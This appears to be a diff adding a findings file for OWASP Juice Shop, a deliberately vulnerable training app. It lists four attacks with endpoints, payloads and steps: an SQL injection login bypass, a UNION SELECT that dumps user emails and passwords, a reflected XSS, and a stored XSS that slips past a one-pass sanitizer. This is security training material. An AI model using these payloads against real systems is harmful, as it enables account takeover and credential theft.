@@ -1,0 +1,21 @@
+JUICE-001 - SQL Injection - Login Bypass
+Endpoint: /rest/user/login
+Payload (Email field): admin@juice-sh.op'--
+Password field: anything
+Steps: Enter payload as email, any password, submit. Logs in as admin without the real password.
+
+JUICE-002 - SQL Injection - Product Search
+Endpoint: /rest/products/search?q=<payload>
+Payload: '))UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
+Steps: Paste into search box, press Enter. Results show Users table data (emails/passwords) instead of products.
+
+JUICE-003 - Reflected XSS - Search Field
+Endpoint: /#/search?q=<payload>
+Payload: <iframe src="javascript:alert(`xss`)">
+Steps: Paste into search box, press Enter. Alert fires immediately on that page load.
+
+JUICE-004 - Stored XSS - Feedback Comment
+Endpoint: POST /api/Feedbacks
+Payload: <<script>Foo</script>iframe src="javascript:alert(`xss`)">
+Why it works: sanitizer strips <script>...</script> in one pass, leaving the iframe tag behind intact.
+Steps: Submit payload in feedback comment. Go to the page where feedback is displayed (e.g. admin page) and reload. Alert fires on page load from the stored comment.
